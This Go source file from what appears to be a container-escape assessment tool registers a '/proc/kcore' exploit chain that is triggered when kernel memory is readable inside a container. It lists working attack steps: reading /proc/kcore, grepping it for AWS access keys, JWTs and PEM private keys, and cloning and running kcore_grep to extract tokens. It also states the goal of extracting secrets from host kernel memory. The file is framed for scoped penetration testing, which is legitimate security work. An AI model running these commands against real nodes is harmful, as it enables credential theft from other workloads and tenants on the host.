package chains

import (
	"github.com/tristanvaquero/escape/pkg/check"
	"github.com/tristanvaquero/escape/pkg/exploit"
)

// kcoreExfil — /proc/kcore is the kernel's RAM as a virtual file.
// Once it's readable inside the workload, every secret that lives in
// kernel memory (cached files, container tokens of every other pod
// on the node, IPSec keys, ...) is on the menu.
type kcoreExfil struct{ exploit.Base }

func (c *kcoreExfil) Matches(results []check.Result) *exploit.Match {
	if !exploit.HasFailedID(results, "host.proc_kcore") {
		return nil
	}
	return &exploit.Match{
		ChainID:    c.ID(),
		Required:   []string{"host.proc_kcore"},
		Confidence: "high",
	}
}

func (c *kcoreExfil) Steps(_ *exploit.Match) []exploit.Step {
	return []exploit.Step{
		{
			Title:   "Confirm kcore is readable",
			Command: `ls -l /proc/kcore; head -c 16 /proc/kcore | xxd | head -1`,
			Note:    "If the head succeeds, all of kernel memory is readable from this PID.",
		},
		{
			Title: "Pull printable strings (cheap, lossy)",
			Command: `strings -n 16 /proc/kcore | grep -E 'AKIA|aws_secret|BEGIN PRIVATE KEY|eyJh' | head`,
			Note: "Quick win: AWS access keys, JWT prefixes, PEM headers. Lossy because kcore is many GB.",
		},
		{
			Title: "Targeted searches with volatility / kcore_grep",
			Command: `# https://github.com/Frichetten/kcore_grep
git clone https://github.com/Frichetten/kcore_grep
go run kcore_grep/main.go -pattern 'eyJh' -count 5`,
			Note: "kcore_grep is a small tool that walks kcore looking for fragments. Use a pattern that fits your engagement scope.",
		},
	}
}

func init() {
	exploit.Register(&kcoreExfil{Base: exploit.Base{
		IDValue:       "chain.kcore_exfil",
		NameValue:     "/proc/kcore → host memory disclosure",
		GoalValue:     "Extract secrets, tokens and keys from host kernel memory.",
		RiskValue:     exploit.RiskActiveRead,
		SeverityValue: check.SeverityCritical,
		ReferencesValue: []string{
			"https://github.com/Frichetten/kcore_grep",
		},
		AttackValue: []string{"T1003", "T1212"},
	}})
}
